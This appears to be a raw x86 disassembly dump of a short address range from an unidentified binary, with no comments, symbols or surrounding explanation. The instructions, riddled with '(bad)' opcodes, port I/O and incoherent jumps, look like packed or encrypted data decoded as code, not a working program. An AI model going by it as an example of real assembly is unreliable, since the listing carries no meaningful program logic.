  41cfd8:	stc    
  41cfd9:	das    
  41cfda:	lock in al,0xb7
  41cfdd:	(bad)  
  41cfde:	hlt    
  41cfdf:	test   al,0xc6
  41cfe1:	xchg   DWORD PTR [ebx+0x3ef0245b],esp
  41cfe7:	xlat   BYTE PTR ds:[ebx]
  41cfe8:	adc    eax,0xde82a9e5
  41cfed:	and    DWORD PTR [edx],0xb34b873e
  41cff3:	xchg   edi,eax
  41cff4:	jo     0x41cfd6
  41cff6:	ss inc edi
  41cff8:	or     bl,BYTE PTR [eax-0x3a]
  41cffb:	push   esp
  41cffc:	ret    
  41cffd:	lea    edi,[edi-0x9]
  41d000:	out    dx,al
  41d001:	mov    bl,dh
  41d003:	cmc    
  41d004:	loope  0x41cff3
  41d006:	leave  
  41d007:	mov    esp,0x7798048a
  41d00c:	sbb    cl,BYTE PTR [edx+0x64]
  41d00f:	add    al,0x82
  41d011:	mov    esi,esp
  41d013:	ss clc 
  41d015:	jg     0x41d04b
  41d017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d018:	mov    ebx,0x3d5c5685
  41d01d:	push   edx
  41d01e:	shl    DWORD PTR [ebx-0x77c03027],0xd2
  41d025:	adc    al,0x21
  41d027:	mov    ds:0x255cdc69,al
  41d02c:	cmp    ch,BYTE PTR [esp+eiz*8]
  41d02f:	inc    esi
  41d030:	ror    BYTE PTR [ebp+0x5cd16579],cl
  41d036:	stos   BYTE PTR es:[edi],al
  41d037:	pop    eax
  41d038:	push   edi
  41d039:	mov    ebp,0xeae3a29f
  41d03e:	aaa    
  41d03f:	sub    edi,DWORD PTR [ebp+edi*8-0x6d]
  41d043:	test   eax,0x7d004e72
  41d048:	mov    cl,0x5
  41d04a:	sub    eax,0x90935d3
  41d04f:	fimul  DWORD PTR [esp+esi*4]
  41d052:	ins    DWORD PTR es:[edi],dx
  41d053:	pop    esi
  41d054:	cli    
  41d055:	fwait
  41d056:	sbb    cl,0x6c
  41d059:	push   ss
  41d05a:	retf   
  41d05b:	loopne 0x41d0c1
  41d05d:	jo     0x41d048
  41d05f:	mov    edi,0x1f0c8e7d
  41d064:	inc    edi
  41d065:	jecxz  0x41d0b6
  41d067:	das    
  41d068:	mov    ch,0x57
  41d06a:	jg     0x41d006
  41d06c:	cmp    bl,BYTE PTR [edx+0x0]
	...
  41d0d3:	add    BYTE PTR [eax],al
  41d0d5:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x50162ebd
  41d0e5:	daa    
  41d0e6:	cmp    BYTE PTR [bx+di],al
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    DWORD PTR [eax],eax
  41d0ed:	add    BYTE PTR [edx-0x71],ch
  41d0f0:	imul   ecx,DWORD PTR [esi-0x8b4ac1c],0xffffffc7
  41d0f7:	pop    ebp
  41d0f8:	or     ebp,DWORD PTR [edx+0x60]
  41d0fb:	dec    ebx
  41d0fc:	push   0xa08b3d2d
  41d101:	outs   dx,BYTE PTR ds:[esi]
  41d102:	xor    esi,DWORD PTR ds:0xc62093e9
  41d108:	out    dx,eax
  41d109:	jle    0x41d0c4
  41d10b:	mov    ah,0x30
  41d10d:	adc    DWORD PTR [edi+edi*4],0x8f0e8094
  41d114:	push   eax
  41d115:	fnstenv [ecx]
  41d117:	icebp  
  41d118:	in     eax,dx
  41d119:	retfw  
  41d11b:	fwait
  41d11c:	in     eax,0xb9
  41d11e:	dec    esp
  41d11f:	ins    BYTE PTR es:[edi],dx
  41d120:	pop    ebx
  41d121:	mov    ds:0xc730f269,eax
  41d126:	and    eax,0xd661cd07
  41d12b:	dec    ebx
  41d12c:	cs pop ebx
  41d12e:	(bad)  
  41d12f:	mov    edi,0x73650dcf
  41d134:	ror    BYTE PTR [ebx+0x1e],1
  41d137:	(bad)  
  41d138:	adc    BYTE PTR [eax+0x4505879a],al
  41d13e:	or     DWORD PTR [ecx+0x67],0x6bf96b2c
  41d145:	test   BYTE PTR [eax+0x2c80e9e8],0x7e
  41d14c:	ja     0x41d1cb
  41d14e:	inc    esi
  41d14f:	mov    esp,0x6ef1aed5
  41d154:	xchg   BYTE PTR [ebx],ah
  41d156:	repnz add ch,dh
  41d159:	fsubr  QWORD PTR [esi-0xb79f68f]
  41d15f:	pop    ds
  41d160:	std    
  41d161:	and    eax,0x1d041168
  41d166:	sbb    DWORD PTR [ebx],ebx
  41d168:	(bad)  
  41d169:	iret   
  41d16a:	mov    ecx,0x61309478
  41d16f:	cwde   
  41d170:	(bad)  
  41d171:	sub    al,0x6f
  41d173:	repnz mov ds:0x945585ab,al
  41d179:	fnstsw WORD PTR [ebp-0x4992a109]
  41d17f:	add    al,0xa3
  41d181:	inc    eax
  41d182:	lods   al,BYTE PTR es:[esi]
  41d184:	adc    eax,0xc8c68789
  41d189:	fld    st(6)
  41d18b:	out    dx,eax
  41d18c:	lock adc DWORD PTR [ecx],esi
  41d18f:	jp     0x41d12c
  41d191:	cmp    edx,DWORD PTR [ecx+0x38ce07e2]
  41d197:	sbb    edi,esi
  41d199:	int3   
  41d19a:	out    0x64,al
  41d19c:	rol    DWORD PTR [edi+0x443d8fc6],cl
  41d1a2:	pusha  
  41d1a3:	retf   0x6a2f
  41d1a6:	cmp    dl,BYTE PTR [esi+0x5cc5cb74]
  41d1ac:	sbb    DWORD PTR [esi],0x2cc120df
  41d1b2:	sbb    bh,BYTE PTR [edx-0x73a8c8e1]
  41d1b8:	pop    edx
  41d1b9:	xor    eax,0x780e955c
  41d1be:	rcl    DWORD PTR [edi],0x82
  41d1c1:	sub    eax,0xe707fb85
  41d1c6:	mov    esi,ds
  41d1c8:	mov    al,BYTE PTR [ebx-0x6e0878bc]
  41d1ce:	fs push cs
  41d1d0:	push   edi
  41d1d1:	add    eax,esi
  41d1d3:	push   edx
  41d1d4:	and    eax,0x799af735
  41d1d9:	inc    ebx
  41d1da:	or     bl,BYTE PTR [ebp+ebx*4-0x3d3efa62]
  41d1e1:	jb     0x41d20e
  41d1e3:	and    eax,0xdcd1bfc4
  41d1e8:	push   ecx
  41d1e9:	sub    ebx,DWORD PTR [ecx-0x79]
  41d1ec:	inc    edi
  41d1ed:	xchg   BYTE PTR [eax],al
	...
  41d253:	add    BYTE PTR [eax],al
  41d255:	add    BYTE PTR [eax-0x3d],dl
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	das    
  41d263:	call   0x39a8fd92
  41d268:	add    DWORD PTR [eax],eax
  41d26a:	add    BYTE PTR [ecx],al
  41d26c:	add    BYTE PTR [eax],al
  41d26e:	retf   
  41d26f:	rcl    bh,0x94
  41d272:	lods   eax,DWORD PTR ds:[esi]
  41d273:	imul   esp,ecx,0xf30f2754
  41d279:	repz adc al,0x9f
  41d27c:	fsub   st,st(7)
  41d27e:	inc    ebx
  41d27f:	(bad)  
  41d280:	add    DWORD PTR [edi-0x38],ecx
  41d283:	cmp    ah,BYTE PTR [esi+ebp*2-0x7f]
  41d287:	ds ret 
  41d289:	les    eax,FWORD PTR [esi-0x11]
  41d28c:	mov    ch,0xf3
  41d28e:	pushf  
  41d28f:	add    DWORD PTR [edi+0x58e699a8],edi
  41d295:	xchg   esi,eax
  41d296:	shl    esi,1
  41d298:	or     eax,0x52b47dc2
  41d29d:	dec    ecx
  41d29e:	jmp    0x41d2c7
  41d2a0:	mov    gs,WORD PTR [ecx+ecx*4-0x5c]
  41d2a4:	xchg   DWORD PTR [ebp-0x47970260],esi
  41d2aa:	sbb    edi,esi
  41d2ac:	fsub   DWORD PTR [edi]
  41d2ae:	repz (bad) 
  41d2b0:	cdq    
  41d2b1:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41d2b4:	xchg   ch,bl
  41d2b6:	mov    bh,0xec
  41d2b8:	pop    ecx
  41d2b9:	shl    DWORD PTR [ebx+0x5c],1
  41d2bc:	outs   dx,DWORD PTR ds:[esi]
  41d2bd:	mov    al,ds:0x606c939
  41d2c2:	(bad)  
  41d2c3:	mov    dh,0x6e
  41d2c5:	mov    esi,0x3464902e
  41d2ca:	mov    ebx,0xcd828a54
  41d2cf:	in     eax,0x7
  41d2d1:	mov    bh,0x34
  41d2d3:	sbb    DWORD PTR [edi],esi
  41d2d5:	fisttp QWORD PTR [ebx-0x24815cef]
  41d2db:	xchg   DWORD PTR [ebx+0x2c],ebp
  41d2de:	mov    esp,0x163d9a43
  41d2e3:	inc    esp
  41d2e4:	xchg   ch,dl
  41d2e6:	pop    es
  41d2e7:	jns    0x41d2f9
  41d2e9:	or     al,0x8d
  41d2eb:	(bad)  
  41d2ed:	cmp    ecx,eax
  41d2ef:	std    
  41d2f0:	fidivr WORD PTR [ecx]
  41d2f2:	outs   dx,DWORD PTR ds:[esi]
  41d2f3:	cmp    BYTE PTR [ebx],bh
  41d2f5:	pusha  
  41d2f6:	sub    BYTE PTR [esi+ebp*2],dl
  41d2f9:	ins    DWORD PTR es:[edi],dx
  41d2fa:	mov    dl,0xdc
  41d2fc:	jl     0x41d2be
  41d2fe:	pusha  
  41d2ff:	enter  0xdbfb,0x33
  41d303:	test   eax,0x8784b72f
  41d308:	repnz and eax,0xa6e47826
  41d30e:	push   ebp
  41d30f:	neg    edx
  41d311:	cli    
  41d312:	rol    BYTE PTR [esi],0x53
  41d315:	push   ds
  41d316:	sbb    al,0x94
  41d318:	dec    eax
  41d319:	repz test eax,0x4c37eace
  41d31f:	pusha  
  41d320:	jg     0x41d307
  41d322:	gs cli 
  41d324:	enter  0x7708,0xe8
  41d328:	lea    esp,[edi-0x598264c0]
  41d32e:	xor    DWORD PTR [ebx-0x1],0xb3230483
  41d335:	and    DWORD PTR [esi],edi
  41d337:	call   0xa573:0x2f453d6e
  41d33e:	fcmovnu st,st(5)
  41d340:	mov    al,0x19
  41d342:	xchg   esi,eax
  41d343:	pop    edi
  41d344:	xchg   ecx,eax
  41d345:	sbb    ebp,DWORD PTR ds:0xb0c16a92
  41d34b:	sbb    BYTE PTR [ebp+edi*4-0xf839a35],ch
  41d352:	sub    DWORD PTR [edx+0x58],edi
  41d355:	push   ss
  41d356:	cmp    ah,bh
  41d358:	mov    ah,0x8e
  41d35a:	pop    ss
  41d35b:	jb     0x41d3b1
  41d35d:	sbb    DWORD PTR [edx-0x14f772d2],esp
  41d363:	cmp    eax,0x7478143f
  41d368:	inc    ebx
  41d369:	sub    al,0xd5
  41d36b:	je     0x41d350
  41d36d:	jecxz  0x41d36f
	...
  41d3d3:	add    BYTE PTR [eax],al
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx-0x74],0xee
  41d3e4:	mov    ecx,0x13a67e1
  41d3e9:	add    BYTE PTR [eax],al
  41d3eb:	add    DWORD PTR [eax],eax
  41d3ed:	add    BYTE PTR [ecx-0x3b],dh
  41d3f0:	out    0x9d,eax
  41d3f2:	mov    dh,0x38
  41d3f4:	sbb    DWORD PTR [esp+esi*8-0x1130b96],ecx
  41d3fb:	scas   al,BYTE PTR es:[edi]
  41d3fc:	nop
  41d3fd:	test   eax,0x344364
  41d402:	sub    al,0xb3
  41d404:	sub    DWORD PTR [edi+0x5d],esp
  41d407:	jecxz  0x41d487
  41d409:	daa    
  41d40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d40b:	adc    al,0xe4
  41d40d:	(bad)  
  41d40e:	dec    ebp
  41d40f:	out    0xd4,al
  41d411:	(bad)  
  41d412:	dec    DWORD PTR [edi-0x13ced692]
  41d418:	xor    edx,DWORD PTR [edi-0x3b226d81]
  41d41e:	out    0x7c,eax
  41d420:	call   0x97002e2f
  41d425:	lds    edx,FWORD PTR [ebx+0x50]
  41d428:	dec    esi
  41d429:	imul   esp,DWORD PTR fs:[edx+0x52ff7b8a],0x7b
  41d431:	test   DWORD PTR [ecx-0x18f754d7],eax
  41d437:	jo     0x41d3b9
  41d439:	mov    ch,BYTE PTR [ebx+eax*8+0x198d593]
  41d440:	ds cli 
  41d442:	add    BYTE PTR [ebx-0x29],dh
  41d445:	xchg   esp,eax
  41d446:	push   0x6b5f4c52
  41d44b:	push   0x4b
  41d44d:	retf   0xc47a
  41d450:	loope  0x41d403
  41d452:	loop   0x41d3fe
  41d454:	and    BYTE PTR [esi+ebx*2-0x2e],ah
  41d458:	adc    ah,bh
  41d45a:	cmp    eax,0xdea593c9
  41d45f:	add    DWORD PTR ds:0x6c527e24,edi
  41d465:	popa   
  41d466:	mov    ds:0x9ff5be72,eax
  41d46b:	es out 0x46,eax
  41d46e:	int3   
  41d46f:	pop    ecx
  41d470:	inc    ecx
  41d471:	std    
  41d472:	sub    esp,ecx
  41d474:	xor    DWORD PTR [ecx+0x6a486bdf],eax
  41d47a:	mov    ch,0x11
  41d47c:	dec    esi
  41d47d:	cmp    esi,DWORD PTR [ebp+0x770b8223]
  41d483:	jge    0x41d41a
  41d485:	inc    ecx
  41d486:	out    dx,al
  41d487:	inc    esp
  41d488:	mov    eax,es
  41d48a:	jg     0x41d4b9
  41d48c:	loop   0x41d48f
  41d48e:	imul   ebp,DWORD PTR [esi-0x25],0xe2b7d223
  41d495:	popa   
  41d496:	lock sbb al,0x5f
  41d499:	(bad)  [ebp-0x22]
  41d49c:	pop    edx
  41d49d:	pop    es
  41d49e:	jle    0x41d4a1
  41d4a0:	(bad)  
  41d4a1:	cdq    
  41d4a2:	xchg   ecx,eax
  41d4a3:	pushf  
  41d4a4:	(bad)  
  41d4a5:	add    DWORD PTR [ebx-0x7c],ebx
  41d4a8:	sbb    ch,dh
  41d4aa:	in     eax,0x1d
  41d4ac:	fnstcw WORD PTR [eax]
  41d4ae:	out    0x89,eax
  41d4b0:	jmp    0x41d4f2
  41d4b2:	shr    DWORD PTR [ebx-0x16d6d1d5],1
  41d4b8:	add    al,0x97
  41d4ba:	(bad)  
  41d4bb:	sub    esi,edx
  41d4bd:	jnp    0x41d535
  41d4bf:	inc    edi
  41d4c0:	adc    eax,0x7e58d86a
  41d4c5:	pop    ebp
  41d4c6:	push   ebp
  41d4c7:	(bad)  
  41d4c8:	adc    eax,0xc1d733f
  41d4cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ce:	mov    dh,0x9
  41d4d0:	fnsave gs:[edi]
  41d4d3:	pop    ecx
  41d4d4:	repz cli 
  41d4d6:	iret   
  41d4d7:	ds xor eax,0x91975b63
  41d4dd:	sti    
  41d4de:	fucom  st(5)
  41d4e0:	lock jle 0x41d4ea
  41d4e3:	pop    ecx
  41d4e4:	dec    ecx
  41d4e5:	xor    BYTE PTR [ecx+ebp*1-0x595f1af8],ah
  41d4ec:	pop    ebx
  41d4ed:	mov    esi,0x0
	...
  41d556:	div    BYTE PTR [esi]
  41d558:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x677d:0x30492c89
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [ebx-0x114e1e09],dh
  41d573:	xchg   dh,bl
  41d575:	mov    ecx,0x913926e5
  41d57a:	call   0x3e3fc414
  41d57f:	sub    al,0xe
  41d581:	lods   al,BYTE PTR ds:[esi]
  41d582:	cwde   
  41d583:	cmp    DWORD PTR [ebp-0x6fa16b1f],ebp
  41d589:	repz mov ds:0xc4b2631a,al
  41d58f:	aad    0xb5
  41d591:	jbe    0x41d5d5
  41d593:	pushf  
  41d594:	sub    al,0x8a
  41d596:	hlt    
  41d597:	and    DWORD PTR [edi+esi*4-0x41fbe81c],ebp
  41d59e:	bound  esp,QWORD PTR [ebx-0x66]
  41d5a1:	sbb    BYTE PTR [ebx+ecx*1-0x2c],cl
  41d5a5:	dec    ebx
  41d5a6:	mov    bh,BYTE PTR [edx+ebx*8-0x33]
  41d5aa:	mov    eax,0x52cd235d
  41d5af:	sbb    eax,0x23b6e55f
  41d5b4:	(bad)  
  41d5b5:	ss jg  0x41d5b6
  41d5b8:	repz cmp DWORD PTR [edi-0xc048b77],ecx
  41d5bf:	add    eax,0x401dc2bb
  41d5c4:	cwde   
  41d5c5:	jmp    0x41d585
  41d5c7:	in     eax,dx
  41d5c8:	lods   eax,DWORD PTR ds:[esi]
  41d5c9:	stc    
  41d5ca:	mov    dh,0x28
  41d5cc:	mov    ds:0xb2c1f968,al
  41d5d1:	sbb    esp,DWORD PTR [edi+0x50]
  41d5d4:	cmc    
  41d5d5:	cmp    BYTE PTR [ebx],0xe2
  41d5d8:	sbb    eax,0x53f08220
  41d5dd:	mov    ah,0xc9
  41d5df:	pmaddwd mm3,mm2
  41d5e2:	pop    esp
  41d5e3:	adc    al,0x7c
  41d5e5:	adc    al,0xc4
  41d5e7:	sti    
  41d5e8:	shr    BYTE PTR [edi+0x75],0xc
  41d5ec:	ret    
  41d5ed:	(bad)  
  41d5ee:	mov    edx,0x293df6
  41d5f3:	dec    ebp
  41d5f4:	adc    esp,DWORD PTR ds:0x81a3837a
  41d5fa:	adc    BYTE PTR [edx+0x21],ah
  41d5fd:	adc    dl,dl
  41d5ff:	(bad)  
  41d600:	jg     0x41d5cd
  41d602:	dec    esi
  41d603:	aas    
  41d604:	out    dx,eax
  41d605:	in     eax,dx
  41d606:	jmp    0x41d67e
  41d608:	mov    dl,0x9a
  41d60a:	jmp    0x36e9:0xd047b2a6
  41d611:	push   edi
  41d612:	retf   
  41d613:	std    
  41d614:	out    dx,al
  41d615:	imul   ecx,ebp,0x6a
  41d618:	ror    DWORD PTR [edi+0x5e],0xa8
  41d61c:	and    bh,BYTE PTR [eax+ebx*1]
  41d61f:	adc    eax,0x179c1704
  41d624:	jl     0x41d601
  41d626:	ret    0xdbb9
  41d629:	mov    ebp,0x57bf986e
  41d62e:	mov    esp,0x3eeb9c9d
  41d633:	cwde   
  41d634:	jnp    0x41d655
  41d636:	in     al,dx
  41d637:	dec    ebp
  41d638:	xchg   DWORD PTR [ebp-0x75878a53],eax
  41d63e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d63f:	call   0x3a67:0xc768a393
  41d646:	lods   al,BYTE PTR ds:[esi]
  41d647:	pop    es
  41d648:	push   esp
  41d649:	imul   eax,DWORD PTR cs:[edx-0x21],0x2a1200f1
  41d651:	leave  
  41d652:	push   ss
  41d653:	cs scas eax,DWORD PTR es:[di]
  41d656:	mov    al,ds:0x14ad3755
  41d65b:	jo     0x41d6b1
  41d65d:	adc    eax,0x97c45414
  41d662:	mov    dh,0x43
  41d664:	sti    
  41d665:	mov    al,ds:0x5c7a7443
  41d66a:	idiv   BYTE PTR [ecx+0x1874]
	...
  41d6d4:	add    BYTE PTR [eax],al
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x4f66e435
  41d6e3:	mov    WORD PTR [ecx-0x50],ds
  41d6e6:	addr16 cmp al,0x1
  41d6e9:	add    BYTE PTR [eax],al
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    cl,cl
  41d6ef:	mov    eax,DWORD PTR [edx+0x6d]
  41d6f2:	cmp    al,0x3b
  41d6f4:	mov    ds:0x19bce73d,al
  41d6f9:	out    0x87,al
  41d6fb:	lods   al,BYTE PTR ds:[esi]
  41d6fc:	push   esi
  41d6fd:	sub    BYTE PTR [ecx-0x37827f47],ch
  41d703:	stos   DWORD PTR es:[edi],eax
  41d704:	mov    dh,0x85
  41d706:	scas   eax,DWORD PTR es:[edi]
  41d707:	enter  0xb728,0x75
  41d70b:	and    eax,0x9e6a13ff
  41d710:	rol    esp,0xf5
  41d713:	pop    edx
  41d714:	dec    esi
  41d715:	pop    ecx
  41d716:	adc    bh,BYTE PTR [eax+edx*4]
  41d719:	test   bh,cl
  41d71b:	xchg   ebp,eax
  41d71c:	push   ebp
  41d71d:	mov    dl,0x60
  41d71f:	ret    0xf810
  41d722:	ins    DWORD PTR es:[edi],dx
  41d723:	mov    dh,0xd7
  41d725:	adc    eax,0x128f95a0
  41d72a:	jnp    0x41d77d
  41d72c:	dec    edi
  41d72d:	loope  0x41d6e3
  41d72f:	arpl   ax,cx
  41d731:	inc    eax
  41d732:	lock fimul DWORD PTR [edi+edx*4-0x17]
  41d737:	mov    edx,0xb65ce3ab
  41d73c:	sbb    DWORD PTR [ebp-0x3],eax
  41d73f:	sbb    DWORD PTR [edi+0x7d513bdf],eax
  41d745:	clc    
  41d746:	push   ebp
  41d747:	out    dx,eax
  41d748:	pop    eax
  41d749:	cmc    
  41d74a:	or     bl,dh
  41d74c:	test   DWORD PTR [edx+0x0],esi
  41d74f:	repz addr16 mov edx,0x64ba6eaf
  41d756:	pop    eax
  41d757:	xor    ebx,DWORD PTR [ecx]
  41d759:	inc    esp
  41d75a:	push   edx
  41d75b:	sbb    eax,0xe664ee07
  41d760:	xchg   edi,eax
  41d761:	jl     0x41d6fd
  41d763:	inc    DWORD PTR [edi+0x74c2cbf2]
  41d769:	jne    0x41d73a
  41d76b:	pop    eax
  41d76c:	xor    ecx,DWORD PTR [ebp-0x76]
  41d76f:	xchg   edi,eax
  41d770:	and    DWORD PTR [ecx-0x3e51c282],esi
  41d776:	js     0x41d7de
  41d778:	adc    bl,BYTE PTR [eax-0x53]
  41d77b:	das    
  41d77c:	icebp  
  41d77d:	call   0xb80:0x6c0d8efc
  41d784:	pop    ebp
  41d785:	mov    cl,BYTE PTR [ecx-0x5b]
  41d788:	std    
  41d789:	rcl    DWORD PTR [edx],cl
  41d78b:	into   
  41d78c:	(bad)  
  41d78d:	adc    eax,eax
  41d78f:	int    0xb2
  41d791:	mov    eax,gs
  41d793:	and    edx,ecx
  41d795:	dec    ebp
  41d796:	jns    0x41d7af
  41d798:	into   
  41d799:	mov    eax,ds:0x432d3e0f
  41d79e:	aam    0xb9
  41d7a0:	ja     0x41d72e
  41d7a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7a3:	push   0x7afb6b04
  41d7a8:	das    
  41d7a9:	jmp    0x41d767
  41d7ab:	loope  0x41d795
  41d7ad:	repnz or ecx,ecx
  41d7b0:	xchg   BYTE PTR [esi-0x5a0d418a],ch
  41d7b6:	push   ebx
  41d7b7:	cmc    
  41d7b8:	(bad)  
  41d7b9:	in     al,0x24
  41d7bb:	mov    ebp,0x506a45e1
  41d7c0:	jns    0x41d7a8
  41d7c2:	pop    ss
  41d7c3:	cmp    eax,0xe7de25ac
  41d7c8:	cmp    BYTE PTR [eax],dl
  41d7ca:	(bad)  
  41d7cb:	fdivr  QWORD PTR [ebp-0x29778d4b]
  41d7d1:	idiv   ecx
  41d7d3:	sahf   
  41d7d4:	sbb    esi,DWORD PTR [ebx+0x2a]
  41d7d7:	call   0x14c642c0
  41d7dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7dd:	in     eax,dx
  41d7de:	push   0xffffff96
  41d7e0:	sub    DWORD PTR [edx],0x2d
  41d7e3:	xor    esp,DWORD PTR [edi-0x3f]
  41d7e6:	retf   
  41d7e7:	rcl    DWORD PTR [ebx+0x5d812676],cl
  41d7ed:	aaa    
	...
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	xchg   esi,eax
  41d863:	dec    edi
  41d864:	aaa    
  41d865:	les    esp,FWORD PTR [edi+0x3d]
  41d868:	add    DWORD PTR [eax],eax
  41d86a:	add    BYTE PTR [ecx],al
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	shr    dl,1
  41d870:	pop    esi
  41d871:	cld    
  41d872:	in     al,0x23
  41d874:	or     esi,DWORD PTR [edx-0x71d5f1be]
  41d87a:	push   ds
  41d87b:	retf   
  41d87c:	and    ebp,DWORD PTR [edi]
  41d87e:	jns    0x41d8ab
  41d880:	fnstenv [edx]
  41d882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d883:	dec    esi
  41d884:	mov    ebp,0x11d9d156
  41d889:	sbb    al,BYTE PTR [ebp-0x5f]
  41d88c:	mov    ch,0x26
  41d88e:	mov    ch,0x36
  41d890:	add    BYTE PTR [eax+0x7b],cl
  41d893:	or     BYTE PTR [edx-0x57],bh
  41d896:	jno    0x41d8ea
  41d898:	sbb    al,0x61
  41d89a:	add    BYTE PTR [edi],dh
  41d89c:	scas   eax,DWORD PTR es:[edi]
  41d89d:	mov    bh,0x5c
  41d89f:	cmc    
  41d8a0:	scas   al,BYTE PTR es:[edi]
  41d8a1:	cmp    edx,DWORD PTR [eax+0x65]
  41d8a4:	mov    dh,0xf8
  41d8a6:	test   al,0xcc
  41d8a8:	mov    ecx,0x4ebf10a1
  41d8ad:	jmp    FWORD PTR [ebx+eax*8-0x264cd53c]
  41d8b4:	xchg   esp,eax
  41d8b5:	pop    eax
  41d8b6:	jecxz  0x41d8a0
  41d8b8:	push   edi
  41d8b9:	xchg   esi,eax
  41d8ba:	mov    edi,DWORD PTR [eax-0x38]
  41d8bd:	es out 0x27,eax
  41d8c0:	addr16 int3 
  41d8c2:	mov    edi,0x66d9198d
  41d8c7:	xchg   DWORD PTR [esi+0x46985f18],esp
  41d8cd:	scas   eax,DWORD PTR es:[edi]
  41d8ce:	push   ds
  41d8cf:	aas    
  41d8d0:	push   edx
  41d8d1:	call   0x861c54d
  41d8d6:	fadd   QWORD PTR [esi+0x1cce0c5a]
  41d8dc:	inc    DWORD PTR [ebx-0x5eaabbc3]
  41d8e2:	aad    0xbf
  41d8e4:	hlt    
  41d8e5:	push   ebx
  41d8e6:	pop    ebp
  41d8e7:	mov    ch,0x13
  41d8e9:	das    
  41d8ea:	pushf  
  41d8eb:	or     al,0x3
  41d8ed:	nop
  41d8ee:	pop    si
  41d8f0:	sub    eax,0xfa5c0e7a
  41d8f5:	mov    ebx,0xa7e5ab46
  41d8fa:	loope  0x41d898
  41d8fc:	or     al,0xe3
  41d8fe:	xchg   edi,eax
  41d8ff:	shl    BYTE PTR [edi-0x47],cl
  41d902:	nop
  41d903:	cwde   
  41d904:	cmp    BYTE PTR [edi-0x10],ch
  41d907:	xor    edx,esp
  41d909:	adc    al,0x7
  41d90b:	inc    ebx
  41d90c:	les    ecx,FWORD PTR [esi]
  41d90e:	loope  0x41d978
  41d910:	jg     0x41d95f
  41d912:	ficomp WORD PTR [eax+eax*4+0x2c8ebff6]
  41d919:	in     eax,0xb5
  41d91b:	add    esi,ebp
  41d91d:	cs pop ecx
  41d91f:	das    
  41d920:	enter  0x8d3c,0xb5
  41d924:	retf   
  41d925:	jl     0x41d980
  41d927:	adc    BYTE PTR [ecx+0x40],cl
  41d92a:	and    al,0x5b
  41d92c:	jg     0x41d8e1
  41d92e:	iret   
  41d92f:	mov    ah,0x81
  41d932:	jno    0x41d8d5
  41d934:	adc    dl,al
  41d936:	ds (bad) 
  41d938:	cmp    DWORD PTR [esi-0x9],0xebbcec69
  41d93f:	jl     0x41d8d1
  41d941:	mov    ah,0xe7
  41d943:	loopne 0x41d98b
  41d945:	adc    BYTE PTR [eax],0x1a
  41d948:	test   al,0x2f
  41d94a:	cwde   
  41d94b:	push   eax
  41d94c:	cmp    BYTE PTR [ebp-0x61],0x5
  41d950:	cld    
  41d951:	jno    0x41d934
  41d953:	in     eax,0x20
  41d955:	retf   
  41d956:	rol    DWORD PTR [esi+esi*8],1
  41d959:	jmp    0x2d3:0x5fc7ea25
  41d960:	mov    gs,WORD PTR [esi-0x79e08957]
  41d966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d968:	inc    eax
  41d969:	(bad)  
  41d96a:	fisubr DWORD PTR [eax+0xe618]
	...
  41d9d4:	add    BYTE PTR [eax],al
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs dec ebp
  41d9e3:	ss dec edi
  41d9e5:	cmp    DWORD PTR [edi+0x3e],esp
  41d9e8:	add    DWORD PTR [eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	inc    ecx
  41d9ef:	sbb    al,0xbb
  41d9f1:	pop    esi
  41d9f2:	adc    DWORD PTR [edi-0x6a1536f0],0x4d73384c
  41d9fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9fd:	(bad)  
  41d9fe:	mov    bl,0xfa
  41da00:	adc    ebx,DWORD PTR [edx]
  41da02:	mov    edi,0xd5514d96
  41da07:	adc    bl,bh
  41da09:	push   es
  41da0a:	lds    ebp,FWORD PTR [ecx+0x28a9802]
  41da10:	sbb    BYTE PTR [eax],ah
  41da12:	mov    dl,0x91
  41da14:	mov    cl,0x5b
  41da16:	aaa    
  41da17:	fs push cs
  41da19:	shl    BYTE PTR [edi-0x3d],1
  41da1c:	pop    edx
  41da1d:	ret    0x7181
  41da20:	imul   esi,DWORD PTR [ebp+0x34],0x52
  41da24:	sub    al,0x54
